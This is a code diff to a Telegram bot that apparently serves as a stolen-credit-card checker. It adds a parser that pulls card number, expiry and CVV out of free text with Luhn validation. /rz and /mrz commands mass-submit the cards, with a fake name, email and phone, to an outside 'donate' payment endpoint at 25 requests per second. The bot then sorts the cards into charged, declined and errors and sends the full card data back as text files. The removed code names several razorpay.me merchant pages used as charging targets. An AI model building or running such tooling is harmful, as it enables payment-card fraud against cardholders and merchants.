@@ -692,17 +692,175 @@ def is_premium(user_id):
     premium_users = load_premium_users()
     return str(user_id) in premium_users
 
-def extract_cc(text):
-    """Extract CC from text in format: card|month|year|cvv"""
-    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
-    matches = re.findall(pattern, text)
+import re
+from datetime import datetime
+from typing import List, Dict, Optional
+
+def extract_cc(text: str) -> List[Dict]:
+    """
+    Extract credit card details from any paragraph text.
+    Handles various formats: piped, spaced, slashed, labeled, etc.
+    
+    Returns list of dicts with keys: number, month, year, cvv, formatted
+    """
+    if not text:
+        return []
+    
+    found_cards = []
+    
+    # Pattern 1: Piped format (card|mm|yy|cvv or card|mm|yyyy|cvv)
+    piped_pattern = r'(\d{15,16})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})'
+    
+    # Pattern 2: Common separators (spaces, slashes, dashes)
+    # Card number with spaces or dashes: 4111 1111 1111 1111 or 4111-1111-1111-1111
+    spaced_card = r'(?:\d{4}[\s-]){3}\d{4}|\d{15,16}'
+    
+    # Pattern 3: Natural language patterns
+    # "expires 12/25", "exp: 12-25", "12/2025", "thru 12/25"
+    nl_patterns = [
+        # "card is 4111... expires 12/25 cvv 123"
+        r'(?:card|cc|number|#|num)[\s:]*(?:is\s+)?([\d\s\-]{15,19})\D+?(?:exp|expires?|thru|valid)[\s:]*(\d{1,2})[\/\-\.](\d{2,4})\D+?(?:cvv|cvc|code)[\s:]*(\d{3,4})',
+        
+        # "4111... 12/25 123" (just the data in order)
+        r'(\d{15,16})\D+?(\d{1,2})[\/\-\.](\d{2,4})\D+?(\d{3,4})',
+        
+        # "12/2025 4111..." (date first)
+        r'(\d{1,2})[\/\-\.](\d{2,4})\D+?(\d{15,16})\D+?(\d{3,4})',
+    ]
+    
+    def clean_card_number(card_str: str) -> Optional[str]:
+        """Remove spaces/dashes and validate length"""
+        cleaned = re.sub(r'[\s\-]', '', card_str)
+        if len(cleaned) in [15, 16] and cleaned.isdigit():
+            return cleaned
+        return None
+    
+    def normalize_year(year_str: str) -> Optional[str]:
+        """Convert 2 or 4 digit year to 4 digit"""
+        year = int(year_str)
+        if len(year_str) == 2:
+            year = 2000 + year
+        if 2020 <= year <= 2040:  # Adjust range as needed
+            return str(year)
+        return None
+    
+    def normalize_month(month_str: str) -> Optional[str]:
+        """Ensure month is valid 01-12"""
+        month = int(month_str)
+        if 1 <= month <= 12:
+            return f"{month:02d}"
+        return None
+    
+    def luhn_check(card_num: str) -> bool:
+        """Luhn algorithm validation"""
+        digits = [int(d) for d in card_num]
+        odd_sum = sum(digits[-1::-2])
+        even_sum = sum(sum(divmod(int(d) * 2, 10)) for d in digits[-2::-2])
+        return (odd_sum + even_sum) % 10 == 0
+    
+    def add_if_valid(card_num: str, month: str, year: str, cvv: str):
+        """Validate and add card to results"""
+        card_clean = clean_card_number(card_num)
+        month_clean = normalize_month(month)
+        year_clean = normalize_year(year)
+        
+        if not all([card_clean, month_clean, year_clean]):
+            return
+            
+        # Validate CVV length matches card type (Amex=4, else=3)
+        if len(card_clean) == 15 and len(cvv) != 4:  # Amex
+            return
+        if len(card_clean) == 16 and len(cvv) != 3:  # Visa/MC/Discover
+            return
+            
+        # Luhn check
+        if not luhn_check(card_clean):
+            return
+            
+        
+        found_cards.append({
+            'number': card_clean,
+            'month': month_clean,
+            'year': year_clean,
+            'cvv': cvv,
+            'formatted': f"{card_clean}|{month_clean}|{year_clean}|{cvv}",
+            'type': get_card_type(card_clean)
+        })
+    
+    def get_card_type(card_num: str) -> str:
+        """Detect card type from BIN"""
+        if card_num.startswith('34') or card_num.startswith('37'):
+            return 'amex'
+        elif card_num.startswith('5'):
+            return 'mastercard'
+        elif card_num.startswith('4'):
+            return 'visa'
+        elif card_num.startswith('6'):
+            return 'discover'
+        return 'unknown'
+    
+    # Search piped format first
+    for match in re.finditer(piped_pattern, text, re.IGNORECASE):
+        add_if_valid(match.group(1), match.group(2), match.group(3), match.group(4))
+    
+    # Search natural language patterns
+    for pattern in nl_patterns:
+        for match in re.finditer(pattern, text, re.IGNORECASE):
+            groups = match.groups()
+            if len(groups) == 4:
+                # Try to identify which group is which based on length/content
+                nums = [g for g in groups if g.replace(' ', '').replace('-', '').isdigit()]
+                if len(nums) >= 3:
+                    # Heuristic: longest is card, 3-4 digit is CVV, others are date
+                    card = max(nums, key=lambda x: len(x.replace(' ', '').replace('-', '')))
+                    cvv_candidates = [n for n in nums if len(n) in [3, 4] and n != card]
+                    date_candidates = [n for n in nums if n != card and n not in cvv_candidates]
+                    
+                    if len(date_candidates) >= 2:
+                        # Assume month/year order
+                        month, year = date_candidates[0], date_candidates[1]
+                        if cvv_candidates:
+                            add_if_valid(card, month, year, cvv_candidates[0])
+    
+    # Pattern 4: Standalone card numbers with nearby dates (broader search)
+    # Find all potential card numbers
+    all_cards = re.finditer(r'\b(\d{4}[\s-]){3}\d{4}\b|\b\d{15,16}\b', text)
+    for card_match in all_cards:
+        card_str = card_match.group()
+        card_clean = clean_card_number(card_str)
+        if not card_clean or not luhn_check(card_clean):
+            continue
+            
+        # Look for date/CVV within 50 chars before/after
+        start = max(0, card_match.start() - 50)
+        end = min(len(text), card_match.end() + 50)
+        context = text[start:end]
+        
+        # Find dates in context
+        date_matches = re.finditer(r'(\d{1,2})[\/\-\.](\d{2,4})', context)
+        cvv_matches = re.findall(r'\b(\d{3,4})\b', context)
+        
+        for date_match in date_matches:
+            month, year = date_match.group(1), date_match.group(2)
+            # Try each CVV found
+            for cvv in cvv_matches:
+                # Don't reuse the year digits as CVV
+                if cvv not in year:
+                    add_if_valid(card_clean, month, year, cvv)
+                    break  # Only take first valid combination
+    
+    # Remove duplicates (based on card number)
+    seen = set()
     cards = []
-    for match in matches:
-        card, month, year, cvv = match
-        if len(year) == 2:
-            year = '20' + year
-        cards.append(f"{card}|{month}|{year}|{cvv}")
+    for card in found_cards:
+        if card['number'] not in seen:
+            seen.add(card['number'])
+            cards.append(card)
+    
     return cards
+
+
+
 
 def is_dead_site_error(error_msg):
     """Check if error indicates dead site"""
@@ -2066,6 +2224,7 @@ async def kill(event):
     parts = event.message.text.split(maxsplit=1)
 
     print('card got :', parts)
+    
 
     if len(parts) < 2:
 
@@ -2100,11 +2259,11 @@ async def kill(event):
 
     card = cards[0]
     print(card)
-    
-    num = card.split('|')[0]
-    mm = card.split('|')[1]
-    yy = card.split('|')[2]
-    cvv = card.split('|')[3]
+
+    num = card['number']
+    mm = card['month']
+    yy = card['year']
+    cvv = card['cvv']
 
     status_msg = await event.reply(
         premium_emoji(
@@ -2130,7 +2289,7 @@ async def kill(event):
             await status_msg.edit(premium_emoji(f"❌ Invalid API response"), parse_mode=html)
             return
 
-        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
+        brand, bin_type, level, bank, country, flag = await get_bin_info(card['number'][:6])
 
         # Use .get() with defaults to safely access dictionary keys
         result_message = result.get('message', 'No response from API')
@@ -3188,221 +3347,469 @@ async def check_single_proxy(event):
 
 
 
-RZ_API = 'https://autoshopify-production-e4f6.up.railway.app'
+import asyncio
+import aiohttp
+import time
+import os
+from telethon import events, Button
+from telethon.tl.types import DocumentAttributeFilename
+from datetime import datetime
 
-RZ_SITE = random.choice(['https://razorpay.me/@holidaymoodsadventure', 'https://razorpay.me/@instituteoftechnicalandscient', 'https://razorpay.me/@Advance-BIM', 'https://razorpay.me/@iropay', 'https://razorpay.me/@bafel'])
+# Your premium emoji IDs list
+PREMIUM_EMOJIS = [
+    "emoji_id_1",
+    "emoji_id_2", 
+    "emoji_id_3",
+    "emoji_id_4",
+    "emoji_id_5"
+]
 
-async def handle_rz_stream(
-    event,
-    progress_msg,
-    cards
-):
+API_URL = "https://chishiya1-production.up.railway.app/donate"
+REQUESTS_PER_SECOND = 25
+COOLDOWN_SECONDS = 5
+BATCH_SIZE = 25
 
-    payload = {
-        "cards": cards,
-        "site_url": RZ_SITE,
-        "amount": 1,
-        "save_results": True
-    }
+# Store active check sessions
+active_sessions = {}
 
-    charged = []
-    live = []
-    dead = []
+class RateLimiter:
+    def __init__(self, rps, cooldown):
+        self.rps = rps
+        self.cooldown = cooldown
+        self.requests = []
+        self.lock = asyncio.Lock()
+        self.stopped = False
+    
+    async def acquire(self):
+        if self.stopped:
+            raise asyncio.CancelledError("Check stopped by user")
+        
+        async with self.lock:
+            now = time.time()
+            self.requests = [req_time for req_time in self.requests if now - req_time < 1.0]
+            
+            if len(self.requests) >= self.rps:
+                await asyncio.sleep(self.cooldown)
+                self.requests.clear()
+            
+            self.requests.append(now)
+    
+    def stop(self):
+        self.stopped = True
 
-    checked = 0
+class CheckSession:
+    def __init__(self, user_id, total_cards):
+        self.user_id = user_id
+        self.total = total_cards
+        self.processed = 0
+        self.approved = []
+        self.declined = []
+        self.errors = []
+        self.rate_limiter = RateLimiter(REQUESTS_PER_SECOND, COOLDOWN_SECONDS)
+        self.is_running = True
+        self.lock = asyncio.Lock()
+    
+    async def add_result(self, result, card_data):
+        async with self.lock:
+            if isinstance(result, Exception):
+                self.errors.append({'card': card_data, 'error': str(result)})
+            elif result['status'] == 200:
+                self.approved.append({'card': card_data, 'result': result})
+            elif result['status'] == 'error':
+                self.errors.append({'card': card_data, 'error': result['result']})
+            else:
+                self.declined.append({'card': card_data, 'result': result})
+            self.processed += 1
+    
+    def get_progress(self):
+        percent = (self.processed / self.total * 100) if self.total > 0 else 0
+        return self.processed, self.total, percent
+    
+    def generate_file(self, category):
+        """Generate text file for specific category"""
+        lines = []
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        
+        if category == 'approved':
+            items = self.approved
+            filename = f"charged_{timestamp}.txt"
+            header = "=== CHARGED CARDS ===\n\n"
+        elif category == 'declined':
+            items = self.declined
+            filename = f"declined_{timestamp}.txt"
+            header = "=== DECLINED CARDS ===\n\n"
+        elif category == 'errors':
+            items = self.errors
+            filename = f"errors_{timestamp}.txt"
+            header = "=== ERRORS ===\n\n"
+        else:
+            return None, None
+        
+        content = header
+        for item in items:
+            if category == 'approved':
+                card = item['card']
+                content += f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']} - {item['result']['result'][:100]}\n"
+            elif category == 'declined':
+                card = item['card']
+                content += f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']} - Status: {item['result']['status']}\n"
+            else:
+                card = item['card']
+                content += f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']} - Error: {item['error']}\n"
+        
+        # Save to temp file
+        filepath = f"/tmp/{filename}"
+        with open(filepath, 'w') as f:
+            f.write(content)
+        
+        return filepath, filename
 
-    connector = aiohttp.TCPConnector(
-        limit=0,
-        ssl=False
-    )
+def get_random_emoji():
+    import random
+    return f"<emoji id={random.choice(PREMIUM_EMOJIS)}>💳</emoji>"
 
-    timeout = aiohttp.ClientTimeout(
-        total=None
-    )
+def get_progress_buttons(session, finished=False):
+    """Generate inline buttons with current counts"""
+    processed, total, percent = session.get_progress()
+    
+    if finished:
+        return [
+            [
+                Button.inline(f"✅ Charged ({len(session.approved)})", b"approved"),
+                Button.inline(f"❌ Declined ({len(session.declined)})", b"declined")
+            ],
+            [
+                Button.inline(f"⚠️ Errors ({len(session.errors)})", b"errors"),
+                Button.inline(f"📊 Done ({processed}/{total})", b"done")
+            ]
+        ]
+    
+    return [
+        [
+            Button.inline(f"✅ Charged ({len(session.approved)})", b"approved"),
+            Button.inline(f"❌ Declined ({len(session.declined)})", b"declined")
+        ],
+        [
+            Button.inline(f"⚠️ Errors ({len(session.errors)})", b"errors"),
+            Button.inline(f"🛑 STOP", b"stop")
+        ]
+    ]
 
-    async with aiohttp.ClientSession(
-        connector=connector,
-        timeout=timeout
-    ) as session:
-
-        async with session.post(
-                f"{RZ_API}/rz/stream",
-                json=payload
-            ) as resp:
-
-                async for raw_line in resp.content:
-
-                    line = (
-                        raw_line
-                        .decode()
-                        .strip()
-                    )
-
-                    if not line.startswith("data: "):
-                        continue
-
-                    try:
-
-                        data = json.loads(
-                            line[6:]
-                        )
-
-                    except:
-                        continue
-
-                    event_type = data.get("type")
-
-                    # START
-                    if event_type == "start":
-
-                        total = data.get("total")
-
-                    # RESULT
-                    elif event_type == "result":
-
-                        checked += 1
-
-                        status = data.get(
-                            "status",
-                            ""
-                        )
-
-                        card = data.get(
-                            "card",
-                            ""
-                        )
-
-                        if status == "CHARGED":
-
-                            charged.append(card)
-
-                        elif status == "LIVE":
-
-                            live.append(card)
-
-                        else:
-
-                            dead.append(card)
-
-                        # THROTTLED UI
-                        if (
-                            checked % 5 == 0
-                            or checked == len(cards)
-                        ):
-
-                            try:
-
-                                await progress_msg.edit(
-                                    f"""
-    ⚡ <b>RZ STREAM</b>
-
-    📦 Total: {len(cards)}
-    ⏳ Checked: {checked}
-
-    ✅ Charged: {len(charged)}
-    🔥 Live: {len(live)}
-    ❌ Dead: {len(dead)}
-    """,
-                                    parse_mode='html'
-                                )
-
-                            except:
-                                pass
-
-                    # COMPLETE
-                    elif event_type == "complete":
-
-                        await progress_msg.edit(
-                            f"""
-    ✅ <b>RZ COMPLETE</b>
-
-    📦 Total: {data.get('total')}
-    ✅ Charged: {data.get('charged')}
-    🔥 Live: {data.get('live')}
-    """,
-                            parse_mode='html'
-                        )
-
-                        break
-
-                    # ERRORS
-                    elif event_type in [
-                        "fatal",
-                        "fatal_error"
-                    ]:
-
-                        await progress_msg.edit(
-                            f"❌ {data.get('error')}"
-                        )
-
-                        break
-
-                
-@bot.on(events.NewMessage(pattern=r'^/rz(?:@[\w_]+)?(?:\s|$)'))
-async def rz(event):
-
-    try:
-
-        card = (
-            event.raw_text
-            .split(" ", 1)[1]
-            .strip()
-        )
-
-    except:
-
-        await event.reply(premium_emoji("❌ Usage: <code>/rz cc|mm|yy|cvv</code>"), parse_mode=html)
+@bot.on(events.NewMessage(pattern=r'^/rz(\s|$)'))
+async def single_check(event):
+    """Single card check command"""
+    if not event.is_private:
         return
-
-    progress = await event.reply(
-        "⚡ Starting RZ stream..."
-    )
-
-    asyncio.create_task(
-        handle_rz_stream(
-            event,
-            progress,
-            [card]
-        )
-    )
-
-
-
-
-@bot.on(events.NewMessage(pattern=r'^/mrz(?:@[\w_]+)?(?:\s|$)'))
-async def mrz(event):
-
+    
     user_id = event.sender_id
-
-    if not KILLER_ALLOWED_USERS(user_id):
-
-        await event.reply(premium_emoji("❌ Usage: <code>You Dont Have Access</code>"), parse_mode=html)
+    cards = extract_cc(event.message.text)
+    
+    if not cards:
+        await event.reply(f"{get_random_emoji()} **No valid CC found!**")
         return
+    
+    card = cards[0] if isinstance(cards, list) else cards
+    
+    user_info = {
+        'name': "Jane Doe",
+        'email': "jane@example.com", 
+        'phone': "+919876543210"
+    }
+    
+    # Create mini session
+    session = CheckSession(user_id, 1)
+    active_sessions[user_id] = session
+    
+    msg = await event.reply(
+        f"{get_random_emoji()} **Checking...**\n`{card['number'][:6]}****{card['number'][-4:]}`",
+        buttons=get_progress_buttons(session)
+    )
+    
+    async with aiohttp.ClientSession() as http_session:
+        try:
+            result = await send_check_request(http_session, session.rate_limiter, card, user_info)
+            await session.add_result(result, card)
+        except asyncio.CancelledError:
+            await event.reply("🛑 **Check Stopped!**")
+            return
+    
+    # Update final message
+    await msg.edit(
+        f"{get_random_emoji()} **Check Complete!**\n\n"
+        f"✅ Charged: `{len(session.approved)}`\n"
+        f"❌ Declined: `{len(session.declined)}`\n"
+        f"⚠️ Errors: `{len(session.errors)}`",
+        buttons=get_progress_buttons(session, finished=True)
+    )
 
+async def send_check_request(session, rate_limiter, card, user_info):
+    """Send single check request to API with proper error handling"""
+    await rate_limiter.acquire()
+    
+    payload = {
+        "amount": 100,
+        "currency": "INR",
+        "name": user_info['name'],
+        "email": user_info['email'],
+        "phone": user_info['phone'],
+        "card_number": card['number'],
+        "mm": card['month'],
+        "yy": card['year'],
+        "cvv": card['cvv']
+    }
+    
+    try:
+        async with session.post(
+            API_URL, 
+            json=payload, 
+            timeout=aiohttp.ClientTimeout(total=30, connect=10, sock_read=20)
+        ) as response:
+            try:
+                response_text = await response.text()
+            except:
+                response_text = ""
+            
+            print(f"[{response.status}] {card['number'][-4:]}")
+            
+            return {
+                'card': card['number'][-4:],
+                'number': card['number'],
+                'month': card['month'],
+                'year': card['year'],
+                'cvv': card['cvv'],
+                'status': response.status,
+                'result': response_text
+            }
+    
+    except asyncio.TimeoutError:
+        print(f"[TIMEOUT] {card['number'][-4:]}")
+        return {
+            'card': card['number'][-4:],
+            'number': card['number'],
+            'month': card['month'],
+            'year': card['year'],
+            'cvv': card['cvv'],
+            'status': 'timeout',
+            'result': 'Request timed out'
+        }
+    
+    except aiohttp.ClientConnectorError as e:
+        print(f"[CONNECTION ERROR] {card['number'][-4:]}: {e}")
+        return {
+            'card': card['number'][-4:],
+            'number': card['number'],
+            'month': card['month'],
+            'year': card['year'],
+            'cvv': card['cvv'],
+            'status': 'error',
+            'result': f'Connection error: {str(e)}'
+        }
+    
+    except aiohttp.ClientError as e:
+        print(f"[CLIENT ERROR] {card['number'][-4:]}: {e}")
+        return {
+            'card': card['number'][-4:],
+            'number': card['number'],
+            'month': card['month'],
+            'year': card['year'],
+            'cvv': card['cvv'],
+            'status': 'error',
+            'result': f'Client error: {str(e)}'
+        }
+    
+    except Exception as e:
+        print(f"[UNKNOWN ERROR] {card['number'][-4:]}: {e}")
+        return {
+            'card': card['number'][-4:],
+            'number': card['number'],
+            'month': card['month'],
+            'year': card['year'],
+            'cvv': card['cvv'],
+            'status': 'error',
+            'result': f'Error: {str(e)}'
+        }
+
+@bot.on(events.NewMessage(pattern=r'^/mrz(\s|$)'))
+async def mass_check(event):
+    """Mass check command with inline buttons"""
+    if not event.is_private:
+        return
+    
+    user_id = event.sender_id
+    
     if not event.reply_to_msg_id:
-        await event.reply(premium_emoji("❌ Usage: <code>Reply /mrz to a text file</code>"), parse_mode=html)
+        await event.reply(f"{get_random_emoji()} **Reply to a text file containing CCs!**")
         return
-
-    reply = await event.get_reply_message()
-
-    path = await reply.download_media()
-
-    with open(path, 'r') as f:
+    
+    reply_msg = await event.get_reply_message()
+    
+    if not reply_msg.file or not reply_msg.file.name.endswith(('.txt', '.csv')):
+        await event.reply(f"{get_random_emoji()} **Please reply to a .txt or .csv file!**")
+        return
+    
+    # Download file
+    status_msg = await event.reply(f"{get_random_emoji()} **Downloading file...**")
+    file_path = await reply_msg.download_media()
+    
+    # Parse CCs
+    all_cards = []
+    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
         content = f.read()
-
-    cards = extract_cc(content)
-
-    progress = await event.reply(
-        f"⚡ Starting stream for {len(cards)} cards..."
+        cards = extract_cc(content)
+        if isinstance(cards, list):
+            all_cards.extend(cards)
+        elif cards:
+            all_cards.append(cards)
+    
+    if not all_cards:
+        await event.reply(f"{get_random_emoji()} **No valid CCs found!**")
+        return
+    
+    total = len(all_cards)
+    
+    # Create session
+    session = CheckSession(user_id, total)
+    active_sessions[user_id] = session
+    
+    # Progress message with buttons
+    progress_msg = await event.reply(
+        f"{get_random_emoji()} **Mass Check Started!**\n\n"
+        f"📊 Total: `{total}`\n"
+        f"⏱ Speed: `{REQUESTS_PER_SECOND}/sec` | Cooldown: `{COOLDOWN_SECONDS}s`",
+        buttons=get_progress_buttons(session)
     )
-
-    asyncio.create_task(
-        handle_rz_stream(
-            event,
-            progress,
-            cards
+    
+    # Store message ID for updates
+    session.message_id = progress_msg.id
+    session.chat_id = event.chat_id
+    
+    user_info = {
+        'name': "Jane Doe",
+        'email': "jane@example.com",
+        'phone': "+919876543210"
+    }
+    
+    async def update_progress():
+        """Update progress message every 2 seconds"""
+        while session.is_running and session.processed < session.total:
+            try:
+                await asyncio.sleep(2)
+                if not session.is_running:
+                    break
+                await bot.edit_message(
+                    session.chat_id,
+                    session.message_id,
+                    text=f"{get_random_emoji()} **Mass Check Running...**\n\n"
+                         f"📊 Progress: `{session.processed}/{session.total}` "
+                         f"(`{(session.processed/session.total*100):.1f}%`)\n"
+                         f"⏱ Speed: `{REQUESTS_PER_SECOND}/sec`",
+                    buttons=get_progress_buttons(session)
+                )
+            except Exception:
+                pass
+    
+    async def process_batch(http_session, batch):
+        """Process a batch of cards"""
+        tasks = []
+        for card in batch:
+            task = send_check_request(http_session, session.rate_limiter, card, user_info)
+            tasks.append((task, card))
+        
+        for task, card in tasks:
+            try:
+                result = await task
+                await session.add_result(result, card)
+            except asyncio.CancelledError:
+                return False
+            except Exception as e:
+                await session.add_result(e, card)
+        return True
+    
+    # Start progress updater
+    progress_task = asyncio.create_task(update_progress())
+    
+    async with aiohttp.ClientSession() as http_session:
+        for i in range(0, total, BATCH_SIZE):
+            if not session.is_running:
+                break
+            
+            batch = all_cards[i:i + BATCH_SIZE]
+            success = await process_batch(http_session, batch)
+            
+            if not success:
+                break
+    
+    # Stop and cleanup
+    session.is_running = False
+    progress_task.cancel()
+    
+    # Final update
+    try:
+        await bot.edit_message(
+            session.chat_id,
+            session.message_id,
+            text=f"{get_random_emoji()} **Mass Check Complete!**\n\n"
+                 f"📊 Total: `{session.total}`\n"
+                 f"✅ Charged: `{len(session.approved)}`\n"
+                 f"❌ Declined: `{len(session.declined)}`\n"
+                 f"⚠️ Errors: `{len(session.errors)}`\n\n"
+                 f"⏱ Finished: `{datetime.now().strftime('%H:%M:%S')}`",
+            buttons=get_progress_buttons(session, finished=True)
         )
+    except Exception:
+        pass
+
+@bot.on(events.CallbackQuery)
+async def handle_button(event):
+    """Handle inline button clicks"""
+    user_id = event.sender_id
+    data = event.data.decode('utf-8')
+    
+    # Check if user has an active session
+    if user_id not in active_sessions:
+        await event.answer("❌ No active session found!", alert=True)
+        return
+    
+    session = active_sessions[user_id]
+    
+    # Verify this user started the check
+    if session.user_id != user_id:
+        await event.answer("❌ You didn't start this check!", alert=True)
+        return
+    
+    if data == "stop":
+        session.rate_limiter.stop()
+        session.is_running = False
+        await event.answer("🛑 Stopping... Please wait", alert=True)
+        return
+    
+    if data == "done":
+        await event.answer("✅ Check completed!", alert=True)
+        return
+    
+    # Generate and send file
+    await event.answer(f"📁 Generating {data} file...", alert=False)
+    
+    filepath, filename = session.generate_file(data)
+    if not filepath:
+        await event.answer("❌ No data available!", alert=True)
+        return
+    
+    # Send file to user
+    await bot.send_file(
+        user_id,
+        filepath,
+        caption=f"📁 {data.upper()} Cards - {len(session.approved if data == 'approved' else session.declined if data == 'declined' else session.errors)} items",
+        force_document=True
     )
+    
+    # Cleanup temp file
+    try:
+        os.remove(filepath)
+    except:
+        pass
+    
+    await event.answer("✅ File sent!", alert=True)
 
 
 
